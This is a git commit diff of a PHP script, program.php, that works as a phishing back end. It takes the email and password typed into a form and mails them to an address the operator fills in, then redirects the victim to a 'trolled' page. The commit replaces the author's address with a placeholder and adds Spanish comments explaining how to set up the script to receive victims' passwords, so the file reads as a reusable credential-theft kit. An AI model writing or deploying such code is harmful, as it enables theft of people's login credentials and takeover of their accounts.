ea39d64212f0b973083da8d4d5032184b4cc77a9
robincajas12 <75333543+robincajas12@users.noreply.github.com>
2021-08-25 12:48:59 -0500

    Update program.php

--- program.php
+++ program.php
@@ -1,9 +1,9 @@
 <?php
-    $destino = "robincajas12@gmail.com";
-    $correo = $_POST["email"];
-    $clave = $_POST["cts"];
-    $contenido = "Email: " . $correo . "Clave: " . $clave;
-    $header = "Simón";
-    mail($destino, "Contacto", $contenido, $header);
+    $destino = "EmailTuYo@gmail.com"; // Aqui tienes que poner el email en el cual vas a recivir el mensaje
+    $correo = $_POST["email"];//obtenermos del formulario el correo
+    $clave = $_POST["cts"]; //obtenmos la contraseña
+    $contenido = "Email: " . $correo . "Clave: " . $clave; //creamos un mensaje con la informacion anterior
+    $header = "Simón"; // este no es importante
+    mail($destino, "Contacto", $contenido, $header); // si no recives la informacion a tu email es por esta funcion tienes es un restricion de tu hosting 
     header("Location:troleado.html");
 ?>
